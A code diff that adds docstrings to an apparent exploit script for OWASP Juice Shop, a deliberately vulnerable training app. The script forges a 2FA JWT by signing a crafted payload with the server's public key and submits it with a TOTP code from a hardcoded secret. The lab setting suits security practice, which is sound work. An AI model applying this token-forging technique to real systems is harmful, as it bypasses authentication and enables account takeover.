@@ -1,3 +1,4 @@
+"""Utilities to forge a temporary JWT and satisfy Juice Shop's 2FA challenge."""
 import requests
 import hmac
 import hashlib
@@ -11,12 +12,14 @@ TOTP_SECRET = "IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH"
 PUBLIC_KEY_PATH = "/home/computeruse/juice-shop/encryptionkeys/jwt.pub"
 
 def base64url_encode(data):
+    """Return URL-safe base64 encoding without padding for bytes or string input."""
     if isinstance(data, str):
         data = data.encode('utf-8')
     encoded = base64.urlsafe_b64encode(data).decode('utf-8')
     return encoded.replace('=', '')
 
 def forge_tmp_token():
+    """Forge a temporary 2FA JWT by signing a crafted payload with the public key material."""
     # 1. Load Public Key
     with open(PUBLIC_KEY_PATH, 'r') as f:
         pub_key = f.read()
@@ -47,6 +50,7 @@ def forge_tmp_token():
     return token
 
 def solve_2fa(token):
+    """Submit the forged token with a live TOTP code to complete the 2FA verification flow."""
     print(f"[*] Generated tmpToken: {token[:20]}...")
     
     totp = pyotp.TOTP(TOTP_SECRET)
